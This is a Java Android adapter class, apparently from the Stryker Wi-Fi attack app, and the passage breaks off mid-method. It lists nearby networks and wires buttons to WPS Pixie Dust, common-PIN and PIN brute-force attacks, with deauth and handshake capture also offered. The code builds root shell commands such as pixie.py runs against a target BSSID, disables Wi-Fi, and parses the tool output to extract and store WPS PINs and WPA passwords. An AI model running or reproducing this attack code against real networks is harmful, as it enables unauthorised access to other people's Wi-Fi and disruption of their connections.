package com.zalexdev.stryker.adapters;

import static com.zalexdev.stryker.utils.TextStyler.convert;
import static com.zalexdev.stryker.utils.TextStyler.danger;
import static com.zalexdev.stryker.utils.TextStyler.info;
import static com.zalexdev.stryker.utils.TextStyler.makeScrollable;
import static com.zalexdev.stryker.utils.TextStyler.underline;
import static com.zalexdev.stryker.utils.TextStyler.warning;

import android.app.Dialog;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.content.res.AppCompatResources;
import androidx.recyclerview.widget.RecyclerView;

import com.google.android.material.button.MaterialButton;
import com.google.android.material.button.MaterialButtonToggleGroup;
import com.google.android.material.card.MaterialCardView;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.snackbar.Snackbar;
import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.textfield.TextInputLayout;
import com.zalexdev.stryker.R;
import com.zalexdev.stryker.objects.WifiNetwork;
import com.zalexdev.stryker.su.SuUtils;
import com.zalexdev.stryker.utils.ExecutorBuilder;
import com.zalexdev.stryker.utils.Preferences;


import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import lombok.Getter;
import lombok.Setter;

public class WifiAdapter extends RecyclerView.Adapter<WifiAdapter.WifiViewHolder> {

    private List<WifiNetwork> wifiallItemList = new ArrayList<>();
    private List<WifiNetwork> wifiItemList = new ArrayList<>();
    private List<WifiNetwork> wpsItemList = new ArrayList<>();
    private final List<String> hidenNames = new ArrayList<>();
    private final Preferences preferences;
    private int hidden = 0;
    @Getter
    @Setter
    private boolean isSaved = false;
    @Getter
    private boolean isWpsOnly = false;


    public WifiAdapter(List<WifiNetwork> wifiItemList) {
        wifiItemList.sort((o1, o2) -> Integer.compare(o2.getSignalDbm(), o1.getSignalDbm()));
        this.wifiallItemList = wifiItemList;
        for (WifiNetwork wifiNetwork : wifiallItemList) {
            if (wifiNetwork.checkWPS()) {
                wpsItemList.add(wifiNetwork);
            }
        }
        Log.d("WifiAdapter", "WifiAdapter: "+wifiItemList.size());
        Log.d("WifiAdapter", "WifiAdapter: "+getItemCount());
        preferences = Preferences.getInstance();
        if (preferences.isHideSSID()){
            for (WifiNetwork wifiNetwork : wifiItemList) {
                hidenNames.add(wifiNetwork.getSsid());
            }
        }
        if (isWpsOnly){
            this.wifiItemList = wpsItemList;
        }else{
            this.wifiItemList = wifiallItemList;
        }
    }

    public void setWpsOnly(boolean wpsOnly) {
        isWpsOnly = wpsOnly;
        if (wpsOnly){
            wifiItemList = wpsItemList;
        }else{
            wifiItemList = wifiallItemList;
        }
        notifyDataSetChanged();
    }

    @NonNull
    @Override
    public WifiViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
        View view = LayoutInflater.from(parent.getContext()).inflate(R.layout.item_wifi, parent, false);
        return new WifiViewHolder(view);
    }

    @Override
    public void onBindViewHolder(@NonNull WifiViewHolder holder, int position) {
        WifiNetwork item = wifiItemList.get(position);
        if (preferences.isHideSSID()){
            hidden++;
            holder.nameTextView.setText(convert("Hidden SSID #"+hidden));
        }else {
            holder.nameTextView.setText(item.getSsid());
        }
        holder.signalTextView.setText(item.getSignalDbm()+"dBm");
        if (preferences.isHideMac()){
            holder.macTextView.setText("XX:XX:XX:XX:XX:XX");
        }else {
            holder.macTextView.setText(item.getBssid());
        }
        holder.modelTextView.setText(item.getModel());

        holder.cardView.setOnClickListener(v -> holder.displayDialog(item));
        if (item.checkLocked()) {
            holder.lock.setVisibility(View.VISIBLE);
        }else {
            if (item.checkWPS()) {
                holder.wps.setVisibility(View.VISIBLE);
            }
        }
        if (item.checkPixie()) {
            holder.pixie.setVisibility(View.VISIBLE);
        }
        if (item.checkFiveGhz()) {
            holder.five.setVisibility(View.VISIBLE);
        }

    }

    @Override
    public int getItemCount() {
        return wifiItemList.size();
    }

    @Override
    public long getItemId(int position) {
        return position;
    }

    @Override
    public int getItemViewType(int position) {
        return position;
    }

    class WifiViewHolder extends RecyclerView.ViewHolder {
        private final TextView nameTextView;
        private final TextView signalTextView;
        private final TextView macTextView;
        private final TextView modelTextView;
        private final ImageView wps;
        private ImageView key;
        private final ImageView pixie;
        private final ImageView five;
        private final ImageView lock;
        private final MaterialCardView cardView;


        WifiViewHolder(View itemView) {
            super(itemView);
            nameTextView = itemView.findViewById(R.id.name);
            signalTextView = itemView.findViewById(R.id.signal);
            macTextView = itemView.findViewById(R.id.mac);
            modelTextView = itemView.findViewById(R.id.model);
            cardView = itemView.findViewById(R.id.card);
            wps = itemView.findViewById(R.id.wps);
            key = itemView.findViewById(R.id.key);
            pixie = itemView.findViewById(R.id.pixie);
            five = itemView.findViewById(R.id.five);
            lock = itemView.findViewById(R.id.lock);

        }



        void displayDialog(WifiNetwork item) {
            Dialog dialog = new Dialog(itemView.getContext());
            dialog.setContentView(R.layout.dialog_wifi);
            dialog.setCancelable(true);
            Objects.requireNonNull(dialog.getWindow()).setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            dialog.getWindow().setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);

            TextView name = dialog.findViewById(R.id.name);
            TextView bssid = dialog.findViewById(R.id.bssid);
            TextView signal = dialog.findViewById(R.id.signal);
            TextView model = dialog.findViewById(R.id.model);
            TextView channel = dialog.findViewById(R.id.channel);
            ImageView key = dialog.findViewById(R.id.key);
            ImageView pixie = dialog.findViewById(R.id.pixie);
            ImageView five = dialog.findViewById(R.id.five);
            ImageView lock = dialog.findViewById(R.id.lock);
            ImageView info = dialog.findViewById(R.id.info);
            ImageView wps = dialog.findViewById(R.id.wps);
            name.setText(item.getSsid());
            bssid.setText(item.getBssid());
            if (preferences.isHideSSID()){
                name.setText("Hidden SSID #"+wifiItemList.indexOf(item));
            }else {
                name.setText(item.getSsid());
            }
            if (preferences.isHideMac()){
                bssid.setText("XX:XX:XX:XX:XX:XX");
            }else {
                bssid.setText(item.getBssid());
            }
            if (item.checkLocked()) {
                lock.setVisibility(View.VISIBLE);
            }else {
                lock.setVisibility(View.GONE);
            }

            if (item.checkWPS()) {
                wps.setVisibility(View.VISIBLE);
            }else {
                wps.setVisibility(View.GONE);
            }

            if (item.checkPixie()) {
                pixie.setVisibility(View.VISIBLE);
            }else {
                pixie.setVisibility(View.GONE);
            }

            if (item.checkFiveGhz()) {
                five.setVisibility(View.VISIBLE);
            }else {
                five.setVisibility(View.GONE);
            }

            info.setOnClickListener(v -> dialogInfo(item));


            model.setText(item.getModel());
            if (item.model != null && !item.model.equals("")) {
                model.setText(item.getModel()+"\n"+item.getManufacturer());
            }
            channel.setText("CH: "+item.getPrimaryChannel()+" ("+item.getFreq()+"MHz)");
            signal.setText(item.getSignalDbm()+"dBm");

            name.setOnClickListener(v -> copyToClipboard(itemView.getContext(), item.getSsid()));
            bssid.setOnClickListener(v -> copyToClipboard(itemView.getContext(), item.getBssid()));
            model.setOnClickListener(v -> copyToClipboard(itemView.getContext(), item.getModel()));
            channel.setOnClickListener(v -> copyToClipboard(itemView.getContext(), String.valueOf(item.getSignalDbm())));

            LinearLayout all = dialog.findViewById(R.id.attacks_layout);
            LinearLayout pixiea = dialog.findViewById(R.id.pixie_dust);
            LinearLayout common = dialog.findViewById(R.id.common_pins);
            LinearLayout pin_brute = dialog.findViewById(R.id.pin_brute);
            LinearLayout wps_pin = dialog.findViewById(R.id.own_pin);
            LinearLayout passwd_brute = dialog.findViewById(R.id.passwd_brute);
            LinearLayout hs_capture = dialog.findViewById(R.id.hs_capture);
            LinearLayout deauth = dialog.findViewById(R.id.deauth);
            pixiea.setOnClickListener(v -> attackDialog(item, 0));
            common.setOnClickListener(v -> attackDialog(item, 1));
            pin_brute.setOnClickListener(v -> attackDialog(item, 2));
            wps_pin.setOnClickListener(v -> attackDialog(item, 3));
            passwd_brute.setOnClickListener(v -> attackDialog(item, 4));
            hs_capture.setOnClickListener(v -> attackDialog(item, 5));
            deauth.setOnClickListener(v -> attackDialog(item, 6));
            if (isSaved()){
                all.setVisibility(View.GONE);
                info.setImageDrawable( AppCompatResources.getDrawable(Preferences.getInstance().getContext(), R.drawable.passwd));
            }




            dialog.show();
        }

         void copyToClipboard(Context context, String text) {

            ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);

            ClipData clip = ClipData.newPlainText("Stryker", text);

            if (clipboard != null) {
                clipboard.setPrimaryClip(clip);
                Snackbar.make(itemView, R.string.copied_to_clipboard, Snackbar.LENGTH_SHORT).show();
            }else {
                Snackbar.make(itemView, R.string.error_copying_to_clipboard, Snackbar.LENGTH_SHORT).show();
            }
        }

        void attackDialog(WifiNetwork item, int attack) {
            Dialog dialog = new Dialog(itemView.getContext());
            dialog.setContentView(R.layout.dialog_wifi_terminal);
            dialog.setCancelable(true);
            Objects.requireNonNull(dialog.getWindow()).setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            dialog.getWindow().setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);

            TextView name = dialog.findViewById(R.id.name);
            TextView bssid = dialog.findViewById(R.id.bssid);
            TextView model = dialog.findViewById(R.id.model);
            TextView signal = dialog.findViewById(R.id.signal);
            TextView terminal = dialog.findViewById(R.id.terminalView);
            ImageView info = dialog.findViewById(R.id.info);
            ImageView wps = dialog.findViewById(R.id.wps);
            ImageView key = dialog.findViewById(R.id.key);
            ImageView pixie = dialog.findViewById(R.id.pixie);
            ImageView five = dialog.findViewById(R.id.five);
            ImageView lock = dialog.findViewById(R.id.lock);
            name.setText(item.getSsid());
            bssid.setText(item.getBssid());
            if (preferences.isHideSSID()){
                name.setText("Hidden SSID #"+wifiItemList.indexOf(item));
            }else {
                name.setText(item.getSsid());
            }
            if (preferences.isHideMac()){
                bssid.setText("XX:XX:XX:XX:XX:XX");
            }else {
                bssid.setText(item.getBssid());
            }
            if (item.checkLocked()) {
                lock.setVisibility(View.VISIBLE);
            }else {
                lock.setVisibility(View.GONE);
            }

            if (item.checkWPS()) {
                wps.setVisibility(View.VISIBLE);
            }else {
                wps.setVisibility(View.GONE);
            }

            if (item.checkPixie()) {
                pixie.setVisibility(View.VISIBLE);
            }else {
                pixie.setVisibility(View.GONE);
            }

            if (item.checkFiveGhz()) {
                five.setVisibility(View.VISIBLE);
            }else {
                five.setVisibility(View.GONE);
            }
            info.setOnClickListener(v -> dialogInfo(item));

            model.setText(item.getModel());
            signal.setText(item.getSignalDbm()+"dBm");

            name.setOnClickListener(v -> copyToClipboard(itemView.getContext(), item.getSsid()));
            bssid.setOnClickListener(v -> copyToClipboard(itemView.getContext(), item.getBssid()));
            model.setOnClickListener(v -> copyToClipboard(itemView.getContext(), item.getModel()));
            signal.setOnClickListener(v -> copyToClipboard(itemView.getContext(), String.valueOf(item.getSignalDbm())));

            TextView attackName = dialog.findViewById(R.id.attack_name);
            ImageView attackIcon = dialog.findViewById(R.id.attack_icon);
            LinearLayout attackLayout = dialog.findViewById(R.id.attack_layout);
            LinearLayout listenerLayout = dialog.findViewById(R.id.listen_layout);
            LinearLayout deauthLayout = dialog.findViewById(R.id.deauth_layout);
            LinearLayout inputLayout = dialog.findViewById(R.id.input_layout);
            TextInputEditText input = dialog.findViewById(R.id.pin_input);
            TextInputLayout inputLayout2 = dialog.findViewById(R.id.outlinedTextField);
            MaterialButtonToggleGroup toggleGroup = dialog.findViewById(R.id.attackInterface);
            MaterialButtonToggleGroup toggleGroup2 = dialog.findViewById(R.id.deauthInterface);
            MaterialButton button = dialog.findViewById(R.id.start);
            MaterialButton log = dialog.findViewById(R.id.log);

            makeScrollable(terminal);


            Log.d("WifiAdapter", "attackDialog: "+preferences.getListenerInterface());
            if (preferences.getListenerInterface().length() < 3) {
                appendToTerminal(warning("No default interfaces found. Setting for default..."+preferences.getListenerInterface()), terminal);
                preferences.setListenerInterface("wlan0");
                preferences.setDeauthInterface("wlan0");
                toggleGroup.check(R.id.wlan0);
                toggleGroup2.check(R.id.wlan02);
                if (attack > 4) {
                    spaceToTerminal(terminal);
                    appendToTerminal(warning("Warning: Wlan0 (internal wifi chip) is not supporting deauth attack in 99.99% cases. This is not a bug, this is how the things works... Check out our wiki for ways to fix this!"), terminal);
                    spaceToTerminal(terminal);
                }
            }else {
                appendToTerminal(info("Restoring default interfaces..."), terminal);
                if (preferences.getListenerInterface().equals(preferences.getDeauthInterface())){
                    if (attack > 4) {
                        if (preferences.getListenerInterface().equals("wlan0")) {
                            spaceToTerminal(terminal);
                            appendToTerminal(warning("Warning: Wlan0 (internal wifi chip) is not supporting deauth attack in 99.99% cases. This is not a bug, this is how the things works... Check out our wiki for ways to fix this!"), terminal);
                            spaceToTerminal(terminal);
                        }
                    }
                    if (preferences.getListenerInterface().equals("wlan0")) {
                        toggleGroup.check(R.id.wlan0);
                        toggleGroup2.check(R.id.wlan02);
                    } else if (preferences.getListenerInterface().equals("wlan1")) {
                        toggleGroup.check(R.id.wlan1);
                        toggleGroup2.check(R.id.wlan12);
                    } else if (preferences.getListenerInterface().equals("wlan2")) {
                        toggleGroup.check(R.id.wlan2);
                        toggleGroup2.check(R.id.wlan22);
                    } else if (preferences.getListenerInterface().equals("wlan3")) {
                        toggleGroup.check(R.id.wlan3);
                        toggleGroup2.check(R.id.wlan32);
                    }
                }else {
                    if (attack > 4) {
                        if (preferences.getDeauthInterface().equals("wlan0")) {
                            spaceToTerminal(terminal);
                            appendToTerminal(warning("Warning: Wlan0 (internal wifi chip) is not supporting deauth attack in 99.99% cases. This is not a bug, this is how the things works... Check out our wiki for ways to fix this!"), terminal);
                            spaceToTerminal(terminal);
                        }
                    }
                    if (preferences.getListenerInterface().equals("wlan0")) {
                        toggleGroup.check(R.id.wlan0);
                    } else if (preferences.getListenerInterface().equals("wlan1")) {
                        toggleGroup.check(R.id.wlan1);
                    } else if (preferences.getListenerInterface().equals("wlan2")) {
                        toggleGroup.check(R.id.wlan2);
                    } else if (preferences.getListenerInterface().equals("wlan3")) {
                        toggleGroup.check(R.id.wlan3);
                    }

                    if (preferences.getDeauthInterface().equals("wlan0")) {
                        toggleGroup2.check(R.id.wlan02);
                    } else if (preferences.getDeauthInterface().equals("wlan1")) {
                        toggleGroup2.check(R.id.wlan12);
                    } else if (preferences.getDeauthInterface().equals("wlan2")) {
                        toggleGroup2.check(R.id.wlan22);
                    } else if (preferences.getDeauthInterface().equals("wlan3")) {
                        toggleGroup2.check(R.id.wlan32);
                    }
                }


            }

            toggleGroup.addOnButtonCheckedListener((group, checkedId, isChecked) -> {
                if (group.getCheckedButtonIds().isEmpty()) {
                    group.check(R.id.wlan0);
                }else{
                    //get the id of the checked button
                    for (int i = 0; i < group.getChildCount(); i++) {
                        if (group.getChildAt(i).getId() == checkedId && isChecked) {
                            preferences.setListenerInterface(itemView.getContext().getResources().getResourceEntryName(checkedId));
                            appendToTerminal(info("Main Interface changed to: " + underline(preferences.getListenerInterface())), terminal);
                        }
                    }
                }
            });

            toggleGroup2.addOnButtonCheckedListener((group, checkedId, isChecked) -> {
                if (group.getCheckedButtonIds().isEmpty()) {
                    group.check(R.id.wlan02);
                }else {
                    //get the id of the checked button
                    for (int i = 0; i < group.getChildCount(); i++) {
                        if (group.getChildAt(i).getId() == checkedId && isChecked) {
                            preferences.setDeauthInterface(itemView.getContext().getResources().getResourceEntryName(checkedId).substring(0, 5));
                            appendToTerminal(info("Deauth Interface changed to: "+underline(preferences.getDeauthInterface())), terminal);
                        }
                    }
                }
            });


            switch (attack) {
                case 0:
                    deauthLayout.setVisibility(View.GONE);
                    attackName.setText(R.string.pixie_dust_attack);
                    attackIcon.setImageResource(R.drawable.pixie);
                    attackLayout.setOnClickListener(v -> {
                        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(itemView.getContext());
                        builder.setTitle(R.string.pixie_dust_attack);
                        builder.setMessage(R.string.pixie_dust_description);
                        builder.setPositiveButton(R.string.ok, (dialog1, which) -> dialog1.dismiss());
                        builder.show();
                    });
                    button.setOnClickListener(v -> {

                        String interfaceName = preferences.getListenerInterface();
                        if (interfaceName.length() <3) {
                            appendToTerminal(danger("No interface selected!"), terminal);
                        }else {
                            dialog.setCancelable(false);
                            listenerLayout.setVisibility(View.GONE);
                            deauthLayout.setVisibility(View.GONE);
                            String command = "python3 -u /CORE/PixieWps/pixie.py -F -K ";
                            command += "-b " + item.getBssid() + " -i " + interfaceName+" ";
                            
                            if (preferences.getBoolean("iface_down") && interfaceName.equals("wlan0")) {
                                command += " --iface-down ";
                                appendToTerminal(info("Setting interface down..."), terminal);
                                new ExecutorBuilder()
                                        .setCommand("svc wifi disable")
                                        .setChroot(false)
                                        .setActivity(preferences.getActivity())
                                        .execute();
                            } else {
                                appendToTerminal(info("Interface will not be set down... [Change in settings if you need it]"), terminal);
                            }
                            if (preferences.getBoolean("pixie_mtk")) {
                                command += " --mtk-wifi ";
                                appendToTerminal(info("Using MTK WiFi option..."), terminal);
                            }else {
                                appendToTerminal(info("Using default Qualcomm/Tensor/Exynos WiFi option... [For mtk change into the settings]"), terminal);
                            }

                            appendToTerminal(info("Starting Pixie Dust attack on " + underline(item.getSsid()) + "..."), terminal);
                            appendToTerminal(info("Using interface: " + underline(interfaceName)), terminal);
                            appendToTerminal(info("Please wait..."), terminal);
                            ExecutorBuilder executorBuilder = new ExecutorBuilder()
                                    .setCommand(command)
                                    .setChroot(true)
                                    .setContext(itemView.getContext())
                                    .setOutput(s -> appendToTerminal(s, terminal))
                                    .setError(s -> appendToTerminal(danger(s), terminal))
                                    .setOnFinished(strings -> {
                                        log.setVisibility(View.VISIBLE);
                                        appendToTerminal(info("Attack finished!"), terminal);
                                        dialog.setCancelable(true);
                                        
                                        if (preferences.getBoolean("iface_down")) {
                                            appendToTerminal(info("Setting interface up..."), terminal);
                                            new ExecutorBuilder()
                                                    .setCommand("svc wifi enable")
                                                    .setChroot(false)
                                                    .setActivity(preferences.getActivity())
                                                    .execute();
                                        }
                                        log.setVisibility(View.VISIBLE);
                                        button.setText(R.string.exit_attack);
                                        button.setOnClickListener(v2 -> dialog.dismiss());
                                        boolean pinFound = false;
                                        boolean pskFound = false;
                                        String pass = "";
                                        String pin = "";
                                        for (String s : strings) {
                                            if (s.toLowerCase().contains(("[+] WPS PIN:").toLowerCase())) {
                                                Matcher m = Pattern.compile("([0-9]{8})").matcher(s);
                                                if (m.find()) {
                                                    item.setPin(m.group());
                                                    pin = m.group();
                                                    pinFound = true;
                                                }
                                            }
                                            if (s.toLowerCase().contains(("[+] WPA PSK:").toLowerCase())) {
                                                pass = s.split(":")[1].replace("'","").trim();
                                                item.setPassword(pass);
                                                pskFound = true;
                                            }
                                        }
                                        if (pinFound && pskFound) {
                                            preferences.addWifi(item);
                                            String finalPass = pass;
                                            preferences.dialog("Network vulnerable!", "Pin and password has been found and saved to the database!\nPassword: " + pass, "OK", "Copy", R.drawable.wifi, aBoolean -> {
                                                if (!aBoolean) {
                                                    copyToClipboard(itemView.getContext(), finalPass);
                                                }else{
                                                    dialog.dismiss();
                                                }
                                            });
                                        }else if(pinFound){
                                            String finalPin = pin;
                                            preferences.dialog("Pin found!", "Pin has been found and saved to the database!\nPin: " + pin, "OK", "Copy", R.drawable.wifi, aBoolean -> {
                                                if (!aBoolean) {
                                                    copyToClipboard(itemView.getContext(), finalPin);
                                                }else{
                                                    dialog.dismiss();
                                                }
                                            });
                                        }
                                    });
                            executorBuilder.execute();
                            button.setText(R.string.stop_attack);
                            button.setOnClickListener(v1 -> {
                                dialog.setCancelable(true);
                                appendToTerminal(warning("Stopping Pixie Dust attack..."), terminal);
                                executorBuilder.kill();
                                
                                if (preferences.getBoolean("iface_down")) {
                                    appendToTerminal(info("Setting interface up..."), terminal);
                                    new ExecutorBuilder()
                                            .setCommand("svc wifi enable")
                                            .setChroot(false)
                                            .setActivity(preferences.getActivity())
                                            .execute();
                                }

                            });
                        }
                    });
                    break;
                case 1:
                    attackName.setText(R.string.common_pins_attack);
                    attackIcon.setImageResource(R.drawable.common_pins);
                    attackLayout.setOnClickListener(v -> {
                        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(itemView.getContext());
                        builder.setTitle(R.string.common_pins_attack);
                        builder.setMessage(R.string.common_pins_desc);
                        builder.setPositiveButton(R.string.ok, (dialog1, which) -> dialog1.dismiss());
                        builder.show();
                    });
                    deauthLayout.setVisibility(View.GONE);
                    button.setOnClickListener(v -> {
                        String interfaceName = preferences.getListenerInterface();
                        if (interfaceName.length() <3) {
                            appendToTerminal(danger("No interface selected!"), terminal);
                        }else {
                            dialog.setCancelable(false);
                            listenerLayout.setVisibility(View.GONE);
                            deauthLayout.setVisibility(View.GONE);
                            appendToTerminal(info("Getting common pins..."), terminal);
                            String commonCommand = "python3 -u /CORE/PixieWps/pixie.py -b "+item.getBssid()+" -i "+interfaceName+ " -p %s";
                            
                            if (preferences.getBoolean("iface_down")) {
                                commonCommand += " --iface-down ";
                                appendToTerminal(info("Setting interface down..."), terminal);
                                new ExecutorBuilder()
                                        .setCommand("svc wifi disable")
                                        .setChroot(false)
                                        .setActivity(preferences.getActivity())
                                        .execute();
                            } else {
                                appendToTerminal(info("Interface will not be set down... [Change in settings if you need it]"), terminal);
                            }
                            ArrayList<String> commonPins = new ArrayList<>();
                            ArrayList<String> attackCmds = new ArrayList<>();
                            ExecutorBuilder wpspinattack = new ExecutorBuilder();
                            String finalCommonCommand = commonCommand;
                            ExecutorBuilder executorBuilder = new ExecutorBuilder()
                                    .setCommand("wpspin -A "+item.getBssid())
                                    .setChroot(true)
                                    .setContext(itemView.getContext())
                                    .setOutput(s -> appendToTerminal(s, terminal))
                                    .setError(s -> appendToTerminal(danger(s), terminal))
                                    .setOnFinished(strings -> {
                                        appendToTerminal(info("Common pins found!"), terminal);
                                        dialog.setCancelable(false);
                                        commonPins.addAll(getPins(strings));
                                        for (String pin : commonPins) {
                                            attackCmds.add(String.format(finalCommonCommand, pin));
                                        }

                                                wpspinattack.setCommands(attackCmds)
                                                .setChroot(true)
                                                .setActivity(preferences.getActivity())
                                                .setOutput(s -> appendToTerminal(s, terminal))
                                                .setError(s -> appendToTerminal(danger(s), terminal))
                                                .setOnFinished(strings1 -> {
                                                    log.setVisibility(View.VISIBLE);
                                                    appendToTerminal(info("Attack finished!"), terminal);
                                                    dialog.setCancelable(true);
                                                    button.setText(R.string.exit_attack);
                                                    button.setOnClickListener(v2 -> dialog.dismiss());
                                                    
                                                    if (preferences.getBoolean("iface_down")) {
                                                        appendToTerminal(info("Setting interface up..."), terminal);
                                                        new ExecutorBuilder()
                                                                .setCommand("svc wifi enable")
                                                                .setChroot(false)
                                                                .setActivity(preferences.getActivity())
                                                                .execute();
                                                    }
                                                    boolean pinFound = false;
                                                    boolean pskFound = false;
                                                    String pass = "";
                                                    String pin = "";
                                                    for (String s : strings) {
                                                        if (s.toLowerCase().contains(("[+] WPS PIN:").toLowerCase())) {
                                                            Matcher m = Pattern.compile("([0-9]{8})").matcher(s);
                                                            if (m.find()) {
                                                                item.setPin(m.group());
                                                                pin = m.group();
                                                                pinFound = true;
                                                            }
                                                        }
                                                        if (s.toLowerCase().contains(("[+] WPA PSK:").toLowerCase())) {
                                                            pass = s.split(":")[1].replace("'","").trim();
                                                            item.setPassword(pass);
                                                            pskFound = true;
                                                        }
                                                    }
                                                    if (pinFound && pskFound) {
                                                        preferences.addWifi(item);
                                                        String finalPass = pass;
                                                        preferences.dialog("Network vulnerable!", "Pin and password has been found and saved to the database!\nPassword: " + pass, "OK", "Copy", R.drawable.wifi, aBoolean -> {
                                                            if (!aBoolean) {
                                                                copyToClipboard(itemView.getContext(), finalPass);
                                                            }else{
                                                                dialog.dismiss();
                                                            }
                                                        });
                                                    }
                                                });
                                        wpspinattack.execute();
                                    });
                            executorBuilder.execute();
                            button.setText(R.string.stop_attack);
                            button.setOnClickListener(v1 -> {
                                dialog.setCancelable(true);
                                appendToTerminal(warning("Stopping Common Pins attack..."), terminal);
                                executorBuilder.kill();
                                wpspinattack.kill();
                                
                                if (preferences.getBoolean("iface_down")) {
                                    appendToTerminal(info("Setting interface up..."), terminal);
                                    new ExecutorBuilder()
                                            .setCommand("svc wifi enable")
                                            .setChroot(false)
                                            .setActivity(preferences.getActivity())
                                            .execute();
                                }
                            });
                        }

                    });
                    break;
                case 2:
                    attackName.setText(R.string.pin_brute_force_attack);
                    attackIcon.setImageResource(R.drawable.pin_brute);
                    attackLayout.setOnClickListener(v -> {
                        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(itemView.getContext());
                        builder.setTitle(R.string.pin_brute_force_attack);
                        builder.setMessage(R.string.brute_force_desc);
                        builder.setPositiveButton(R.string.ok, (dialog1, which) -> dialog1.dismiss());
                        builder.show();
                    });
                    deauthLayout.setVisibility(View.GONE);
                    button.setOnClickListener(v -> {
                        String interfaceName = preferences.getListenerInterface();
                        if (interfaceName.length() <3) {
                            appendToTerminal(danger("No interface selected!"), terminal);
                        }else {
                            dialog.setCancelable(false);
                            listenerLayout.setVisibility(View.GONE);
                            deauthLayout.setVisibility(View.GONE);
                            appendToTerminal(info("Starting Pin Brute Force attack on " + underline(item.getSsid()) + "..."), terminal);
                            appendToTerminal(info("Using interface: " + underline(interfaceName)), terminal);
                            appendToTerminal(info("Please wait..."), terminal);
                            String command = "python3 -u /CORE/PixieWps/pixie.py -b "+item.getBssid()+" -i "+interfaceName+" -B";
                            
                            if (preferences.getBoolean("iface_down")) {
                                command += " --iface-down ";
                                appendToTerminal(info("Setting interface down..."), terminal);
                                new ExecutorBuilder()
                                        .setCommand("svc wifi disable")
                                        .setChroot(false)
                                        .setActivity(preferences.getActivity())
                                        .execute();
                            } else {
                                appendToTerminal(info("Interface will not be set down... [Change in settings if you need it]"), terminal);
                            }
                            ExecutorBuilder executorBuilder = new ExecutorBuilder()
                                    .setCommand(command)
                                    .setChroot(true)
                                    .setActivity(preferences.getActivity())
                                    .setOutput(s -> appendToTerminal(s, terminal))
                                    .setError(s -> appendToTerminal(danger(s), terminal))
                                    .setOnFinished(strings -> {
                                        log.setVisibility(View.VISIBLE);
                                        appendToTerminal(info("Attack finished!"), terminal);
                                        dialog.setCancelable(true);
                                        button.setText(R.string.exit_attack);
                                        button.setOnClickListener(v2 -> dialog.dismiss());
                                        
                                        if (preferences.getBoolean("iface_down")) {
                                            appendToTerminal(info("Setting interface up..."), terminal);
                                            new ExecutorBuilder()
                                                    .setCommand("svc wifi enable")
                                                    .setChroot(false)
                                                    .setActivity(preferences.getActivity())
                                                    .execute();
                                        }
                                        boolean pinFound = false;
                                        boolean pskFound = false;
                                        String pass = "";
                                        String pin = "";
                                        for (String s : strings) {
                                            if (s.toLowerCase().contains(("[+] WPS PIN:").toLowerCase())) {
                                                Matcher m = Pattern.compile("([0-9]{8})").matcher(s);
                                                if (m.find()) {
                                                    item.setPin(m.group());
                                                    pin = m.group();
                                                    pinFound = true;
                                                }
                                            }
                                            if (s.toLowerCase().contains(("[+] WPA PSK:").toLowerCase())) {
                                                pass = s.split(":")[1].replace("'","").trim();
                                                item.setPassword(pass);
                                                pskFound = true;
                                            }
                                        }
                                        if (pinFound && pskFound) {
                                            preferences.addWifi(item);
                                            String finalPass = pass;
                                            preferences.dialog("Network vulnerable!", "Pin and password has been found and saved to the database!\nPassword: " + pass, "OK", "Copy", R.drawable.wifi, aBoolean -> {
                                                if (!aBoolean) {
                                                    copyToClipboard(itemView.getContext(), finalPass);
                                                }else{
                                                    dialog.dismiss();
                                                }
                                            });
                                        }
                                    });
                            executorBuilder.execute();
                            button.setText(R.string.stop_attack);
                            button.setOnClickListener(v1 -> {
                                dialog.setCancelable(true);
                                appendToTerminal(warning("Stopping Pin Brute Force attack..."), terminal);
                                executorBuilder.kill();
                                
                                if (preferences.getBoolean("iface_down")) {
                                    appendToTerminal(info("Setting interface up..."), terminal);
                                    new ExecutorBuilder()
                                            .setCommand("svc wifi enable")
                                            .setChroot(false)
                                            .setActivity(preferences.getActivity())
                                            .execute();
                                }
                            });

                        }

                    });
                    break;
                case 3:
                    attackName.setText(R.string.own_pin_attack);
                    attackIcon.setImageResource(R.drawable.own_pin);
                    attackLayout.setOnClickListener(v -> {
                        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(itemView.getContext());
                        builder.setTitle(R.string.own_pin_attack);
                        builder.setMessage(R.string.own_pin_desc);
                        builder.setPositiveButton(R.string.ok, (dialog1, which) -> dialog1.dismiss());
                        builder.show();
                    });
                    deauthLayout.setVisibility(View.GONE);
                    inputLayout.setVisibility(View.VISIBLE);
                    button.setOnClickListener(v -> {
                        String interfaceName = preferences.getListenerInterface();
                        if (interfaceName.length() <3) {
                            appendToTerminal(danger("No interface selected!"), terminal);
                        }else if (input.getText().toString().isEmpty() && preferences.getListenerInterface().equals("wlan0")) {
                            appendToTerminal(warning("Currently we are supporting NULL pin attack only for external adapters. We are working for the solution"), terminal);
                            appendToTerminal(warning("Connect adapter and change interface for wlan1 or enter 8 digit pin"), terminal);
                        }else {
                            dialog.setCancelable(false);
                            listenerLayout.setVisibility(View.GONE);
                            deauthLayout.setVisibility(View.GONE);
                            inputLayout.setVisibility(View.GONE);
                            appendToTerminal(info("Starting Own Pin attack on " + underline(item.getSsid()) + "..."), terminal);
